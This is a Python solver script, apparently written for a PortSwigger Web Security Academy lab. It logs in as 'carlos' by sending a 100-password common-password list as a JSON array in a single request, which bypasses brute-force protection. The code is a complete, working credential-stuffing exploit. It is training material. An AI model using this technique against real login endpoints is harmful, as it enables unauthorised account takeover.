#!/usr/bin/env python3
"""
Broken brute-force protection, multiple credentials per request
PortSwigger Web Security Academy -- Authentication

Companion script for the writeup: 06-broken-brute-force-protection-multiple-credentials-per-request.md

What this does:
    The login endpoint accepts JSON and, per our verified testing, accepts the
    "password" field as either a single string or an array of strings -- testing
    every value in the array against the account in a single request. This script
    sends exactly one cold, unauthenticated POST with the entire 100-entry
    candidate password list embedded as a JSON array, and checks for the 302
    redirect that means one of the embedded guesses matched.

Usage:
    python 06-broken-brute-force-protection-multiple-credentials-per-request.py <lab-url>

Requirements:
    pip install httpx
"""

import sys
import httpx

PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow",
]

TARGET_USER = "carlos"


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    resp = client.post(f"{lab_url}/login", json={
        "username": TARGET_USER,
        "password": PASSWORDS,
    })
    print(f"[*] Multi-credential response: {resp.status_code}")

    if resp.status_code == 302 or "my-account" in resp.text.lower():
        print("[+] Multi-credential: password array accepted, redirected to my-account.")
    else:
        check = client.get(f"{lab_url}/my-account")
        if check.status_code == 200 and "log in" not in check.text.lower():
            print("[+] Multi-credential: logged in after array submission.")
        else:
            print("[-] Array submission did not authenticate.")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
